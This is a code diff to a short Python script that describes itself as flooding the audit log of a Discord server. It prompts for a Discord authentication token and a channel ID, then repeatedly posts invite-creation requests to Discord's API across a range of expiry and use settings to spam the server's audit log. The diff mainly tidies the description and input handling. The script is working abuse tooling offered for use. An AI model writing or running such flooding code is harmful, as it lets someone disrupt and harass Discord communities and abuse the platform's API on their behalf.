@@ -1,9 +1,9 @@
 
 import requests
 
-desc = "Floods the Audit Log of a Discord server"
+desc = "Floods the Audit Log of a Discord server. Requires invite perms."
 params = {
-    "token"      : "your Discord authentication token",
+    "token" : "your Discord authentication token",
     "channel_id" : "a channel's ID in the Discord server you want to audit bomb",
 }
 
@@ -13,4 +13,7 @@ def run(token, channel_id):
         for use in [0, 100, 50, 25, 10, 5, 1]:
             requests.post("https://discord.com/api/v9/channels/"+channel_id+"/invites", headers=headers, json={"validate":None,"max_age":age,"max_uses":use,"target_user_id":None,"target_type":None,"temporary":False})
 if __name__ == "__main__":
-    audit_bomb(input(params["token"]+": "), input(params["channel_id"]+": "),)
+    config = {}
+    for param in params:
+        config[param] = input("Enter "+params[param]+": ")
+    run(**config)
